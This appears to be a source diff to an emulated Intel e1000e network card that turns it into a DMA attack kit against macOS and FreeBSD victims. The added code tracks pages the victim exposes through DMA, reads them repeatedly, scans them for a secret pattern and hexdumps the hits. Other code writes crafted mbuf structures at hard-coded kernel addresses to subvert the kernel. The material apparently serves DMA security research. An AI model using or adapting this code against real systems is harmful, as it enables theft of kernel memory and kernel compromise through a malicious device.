@@ -32,14 +32,14 @@
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, see <http://www.gnu.org/licenses/>.
 */
+#include <sys/queue.h>
+
+#include "pcie.h"
 #include "pcie-debug.h"
 #include "log.h"
+#include "mask.h"
 
-#ifndef POSTGRES
-#include <sys/param.h>
-#include <sys/mbuf.h>
-#endif
-
+#include "hexdump.h"
 #include "hw/hw.h"
 #include "hw/pci/pci.h"
 #include "net/net.h"
@@ -58,6 +58,20 @@
 
 #include "trace.h"
 
+/* This has to come last because of macOS's bloody stupid approach to mbuf
+ * members
+ */
+
+#ifndef POSTGRES
+#ifdef VICTIM_MACOS
+#include "macos-stub-mbuf.h"
+#include "macos-mbuf-manipulation.h"
+#else
+#include <sys/param.h>
+#include <sys/mbuf.h>
+#endif
+#endif
+
 /*
  * Attack tool kit types
  * ---------------------------------------------------------------------------
@@ -67,6 +81,8 @@ void attempt_to_subvert_windows(E1000ECore* core, hwaddr ba);
 void attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba);
 void print_rx_buffer_address_information(E1000ECore *core);
 void print_tx_buffer_address_information(E1000ECore *core);
+void record_windows_from_tx_buffer(E1000ECore *core);
+void record_windows(E1000ECore *core);
 
 /*
  * ----------------------------------------------------------------------------
@@ -688,7 +704,9 @@ _e1000e_setup_tx_offloads(E1000ECore *core, struct e1000_tx *tx)
     }
 
     if (tx->sum_needed & E1000_TXD_POPTS_IXSM) {
-        net_tx_pkt_update_ip_hdr_checksum(tx->tx_pkt);
+		/* XXX cr437 */
+		fprintf(stderr, "Skipping update ip header checksum from e1000...\n");
+        /*net_tx_pkt_update_ip_hdr_checksum(tx->tx_pkt);*/
     }
 }
 
@@ -752,6 +770,11 @@ process_tx_desc(E1000ECore *core,
     uint64_t addr;
     struct e1000_context_desc *xp = (struct e1000_context_desc *)dp;
     bool eop = txd_lower & E1000_TXD_CMD_EOP;
+
+	if (queue_index >= E1000E_NUM_QUEUES) {
+		printf("Trying to process tx desc on queue: %d.\n", queue_index);
+	}
+	assert(queue_index < E1000E_NUM_QUEUES);
 
     if (dtype == E1000_TXD_CMD_DEXT) {    /* context descriptor */
         op = le32_to_cpu(xp->cmd_and_length);
@@ -2644,6 +2667,7 @@ set_tdt(E1000ECore *core, int index, uint32_t val)
 
 	PDBG("Sending from ring: %d", _e1000e_mq_queue_idx(TDT, index));
 	/*print_tx_buffer_address_information(core);*/
+	record_windows(core);
 
     _e1000e_tx_ring_init(core, &txr, _e1000e_mq_queue_idx(TDT, index));
     start_xmit(core, &txr);
@@ -3553,8 +3577,10 @@ e1000e_core_post_load(E1000ECore *core)
  */
 #ifndef POSTGRES
 void
-print_mbuf_flags(int m_flags)
+print_mbuf_flags(int mbuf_flags_field)
 {
+#ifdef VICTIM_MACOS
+#else
 	static const int flag_count = 22;
 	static const int flags[flag_count] = {
 		M_EXT,
@@ -3587,7 +3613,7 @@ case flag:																\
 	break
 
 	for (int i = 0; i < flag_count; ++i) {
-		switch (m_flags & flags[i]) {
+		switch (mbuf_flags_field & flags[i]) {
 			CASE(M_EXT);
 			CASE(M_PKTHDR);
 			CASE(M_EOR);
@@ -3614,6 +3640,7 @@ case flag:																\
 	}
 
 #undef CASE
+#endif /* def VICTIM_MACOS */
 }
 
 static inline uint32_t
@@ -3622,6 +3649,9 @@ bswap24(uint32_t x)
 	return ((x & 0xFF0000) >> 16) | (x & 0x00FF00) | ((x & 0x0000FF) << 16);
 }
 
+#ifdef VICTIM_MACOS
+#define FIX_MBUF()		endianness_swap_mac_mbuf_header(mbuf);
+#else
 #define FIX_MBUF()														\
 	FIX_64_FIELD(mbuf->m_next);											\
 	FIX_64_FIELD(mbuf->m_nextpkt);										\
@@ -3635,7 +3665,8 @@ bswap24(uint32_t x)
 	mbuf->m_ext.ext_flags = bswap24(mbuf->m_ext.ext_flags);				\
 	FIX_64_FIELD(mbuf->m_ext.ext_free);									\
 	FIX_64_FIELD(mbuf->m_ext.ext_arg1);									\
-	FIX_64_FIELD(mbuf->m_ext.ext_arg2);
+	FIX_64_FIELD(mbuf->m_ext.ext_arg2)
+#endif
 
 
 void
@@ -3644,7 +3675,7 @@ mbuf_le_to_cpu(struct mbuf *mbuf)
 #define FIX_32_FIELD(field)	field = (typeof(field))le32_to_cpu((int32_t)field)
 #define FIX_64_FIELD(field)	field = (typeof(field))le64_to_cpu((int64_t)field)
 
-	FIX_MBUF()
+	FIX_MBUF();
 
 #undef FIX_32_FIELD
 #undef FIX_64_FIELD
@@ -3656,17 +3687,17 @@ mbuf_cpu_to_le(struct mbuf *mbuf)
 #define FIX_32_FIELD(field) field = (typeof(field))cpu_to_le32((int32_t)field)
 #define FIX_64_FIELD(field) field = (typeof(field))cpu_to_le64((int64_t)field)
 
-	FIX_MBUF()
+	FIX_MBUF();
 
 #undef FIX_32_FIELD
 #undef FIX_64_FIELD
 }
 
+#ifndef VICTIM_MACOS
 void
-print_host_mbuf_information(const uint8_t* buffer)
+print_freebsd_mbuf_information(const uint8_t* buffer)
 {
 	struct mbuf *mbuf = (struct mbuf *)buffer;
-	mbuf_le_to_cpu(mbuf);
 	printf("m_next: %p.\n", mbuf->m_next);
 	printf("m_nextpkt: %p.\n", mbuf->m_nextpkt);
 	printf("m_data: %p.\n", mbuf->m_data);
@@ -3676,6 +3707,7 @@ print_host_mbuf_information(const uint8_t* buffer)
 	print_mbuf_flags(mbuf->m_flags);
 	puts(")");
 }
+#endif
 
 typedef hwaddr (*get_buffer_address_fp)(E1000ECore *, dma_addr_t);
 
@@ -3699,13 +3731,27 @@ get_buffer_address_from_tx_descriptor(E1000ECore *core,
 	return le64_to_cpu(desc.buffer_addr);
 }
 
+
+
 void
 print_buffer_address_information(hwaddr ba, void *opaque)
 {
 	E1000ECore *core = (E1000ECore *)opaque;
-	uint8_t mbuf_buffer[sizeof(struct mbuf)];
+	struct mbuf mbuf_buffer;
 
-	printf("Buffer: 0x%lx.", ba);
+	printf("Buffer: 0x%lx.\n", ba);
+#ifdef VICTIM_MACOS
+	if (ba % 2048 == 0) {
+		printf("Address is 2K aligned. Probably cluster.");
+	} else {
+		pci_dma_read(core->owner, ba & ~0xFF, (uint8_t *)(&mbuf_buffer),
+			sizeof(struct mbuf));
+		mbuf_le_to_cpu(&mbuf_buffer);
+		print_macos_mbuf_header(&mbuf_buffer);
+	}
+	hexdump((uint8_t *)(&mbuf_buffer), 256);
+	putchar('\n');
+#else
 	if (ba % 2048 == 0) {
 		printf(" Address is 2K aligned. Probably a cluster.");
 	} else {
@@ -3718,9 +3764,125 @@ print_buffer_address_information(hwaddr ba, void *opaque)
 		}
 		putchar('\n');
 		pci_dma_read(core->owner, ba & ~0xFF, mbuf_buffer, sizeof(struct mbuf));
-		print_host_mbuf_information(mbuf_buffer);
+		mbuf_le_to_cpu(mbuf_buffer);
+		print_freebsd_mbuf_information(mbuf_buffer);
 	}
 	putchar('\n');
+#endif
+}
+
+SLIST_HEAD(PageListHead, PageListEntry) page_list_head
+	= SLIST_HEAD_INITIALIZER(page_list_head);
+
+struct PageListEntry {
+	uint64_t page_address;
+	SLIST_ENTRY(PageListEntry) page_list;
+};
+
+/* I don't like using the constructor attribute, but it's the simplest way to
+ * go about this.
+ */
+void
+initialise_page_list() __attribute__((constructor))
+{
+	printf("INIT PAGE LIST\n");
+	SLIST_INIT(&page_list_head);
+}
+
+bool
+address_in_page_list(uint64_t address)
+{
+	struct PageListEntry *page_list_entry;
+	SLIST_FOREACH(page_list_entry, &page_list_head, page_list) {
+		if (page_list_entry->page_address == address) {
+			return true;
+		}
+	}
+	return false;
+}
+
+void
+check_for_secret(uint64_t page_address, uint8_t page[4096])
+{
+#define PATTERN_LENGTH 8
+	int64_t j;
+	uint64_t run_length = 1;
+	for (uint64_t i = 0; i < 4096; i += PATTERN_LENGTH) {
+		if (page[i] == 'i') {
+			j = i;
+			while (run_length < PATTERN_LENGTH && --j >= 0 && page[j] == 'i') {
+				++run_length;
+			}
+			j = i;
+			while (run_length < PATTERN_LENGTH && ++j < 4096 && page[j] == 'i') {
+				++run_length;
+			}
+			if (run_length == PATTERN_LENGTH) {
+				break;
+			}
+		}
+	}
+	if (run_length == PATTERN_LENGTH) {
+		printf("Found pattern in page: 0x%lx. \n", page_address);
+		hexdump(page, 4096);
+	}
+#undef PATTERN_LENGTH
+}
+
+void
+record_windows_from_buffer_address(hwaddr ba, void *opaque)
+{
+#ifdef VICTIM_MACOS
+	E1000ECore *core = (E1000ECore *)opaque;
+	struct mbuf mbuf_buffer;
+	struct PageListEntry *entry, *next;
+	uint8_t page[4096];
+	int read_result;
+
+	uint64_t page_address = ba & ~uint64_mask(12);
+
+	if (!address_in_page_list(page_address)) {
+		entry = malloc(sizeof(struct PageListEntry));
+		entry->page_address = page_address;
+		SLIST_INSERT_HEAD(&page_list_head, entry, page_list);
+		printf("Adding page 0x%lx to windows.\n", page_address);
+	}
+
+	bool check_head = true;
+	next = entry = SLIST_FIRST(&page_list_head);
+
+	while (check_head && entry != NULL) {
+		check_head = false;
+		read_result = perform_dma_long_read(page, 4096,
+			core->owner->devfn, 8, entry->page_address);
+		if (read_result == 0) {
+			check_for_secret(entry->page_address, page);
+		} else {
+			printf("Couldn't read 0x%lx. Removing head entry.\n",
+				entry->page_address);
+			check_head = true;
+			SLIST_REMOVE_HEAD(&page_list_head, page_list);
+			free(entry);
+			next = entry = SLIST_FIRST(&page_list_head);
+		}
+	}
+
+	while ((entry != NULL) && (next = SLIST_NEXT(entry, page_list)) != NULL) {
+		read_result = perform_dma_long_read(page, 4096,
+			core->owner->devfn, 8, next->page_address);
+		if (read_result == 0) {
+			check_for_secret(next->page_address, page);
+			entry = next;
+		} else {
+			printf("Couldn't read 0x%lx. Removing body entry.\n",
+				next->page_address);
+			SLIST_REMOVE_AFTER(entry, page_list);
+			free(entry);
+		}
+	}
+#else
+#error "Recording mbuf based information only supported on MACOS."
+#endif
 }
 
 const void *KERNEL_PRINTF_ADDR = 	(void *)0xffffffff80a4da90ll;
@@ -3729,6 +3891,7 @@ const void *KERNEL_PANIC_ADDR =		(void *)0xffffffff80a0b9a0ll;
 void
 attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba)
 {
+#ifdef VICTIM_FREEBSD
 	char buffer[256];
 	struct mbuf *mbuf = (struct mbuf *)(buffer);
 	char *data_buffer = (buffer + sizeof(struct mbuf));
@@ -3787,6 +3950,7 @@ attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba)
 
 	PDBG("DMA writing to addr %lx", ba & ~0xFF);
 	pci_dma_write(core->owner, ba & ~0xFF, buffer, 256);
+#endif
 }
 
 static inline hwaddr
@@ -3914,11 +4078,16 @@ for_each_buffer_address(E1000ECore *core, const E1000E_RingInfo *rxi,
 			cursor_addr = _e1000e_ring_base(core, rxi);
 		}
 	}
+
+	if (done != NULL) {
+		done(opaque);
+	}
 }
 
 void
 print_rx_buffer_address_information(E1000ECore *core)
 {
+	printf("RX Buffer.\n");
     E1000E_RxRing rxr;
     const E1000E_RingInfo *rxi = rxr.i;
 
@@ -3936,10 +4105,21 @@ print_rx_buffer_address_information(E1000ECore *core)
 void
 print_tx_buffer_address_information(E1000ECore *core)
 {
+	printf("TX Buffer.\n");
 	E1000E_TxRing txr;
 	const E1000E_RingInfo *txi = txr.i;
 	_e1000e_tx_ring_init(core, &txr, 0);
 	for_each_buffer_address(core, txi, get_buffer_address_from_tx_descriptor,
 		print_buffer_address_information, NULL, core);
+}
+
+void
+record_windows(E1000ECore *core)
+{
+	E1000E_TxRing txr;
+	const E1000E_RingInfo *txi = txr.i;
+	_e1000e_tx_ring_init(core, &txr, 0);
+	for_each_buffer_address(core, txi, get_buffer_address_from_tx_descriptor,
+		record_windows_from_buffer_address, NULL, core);
 }
 #endif
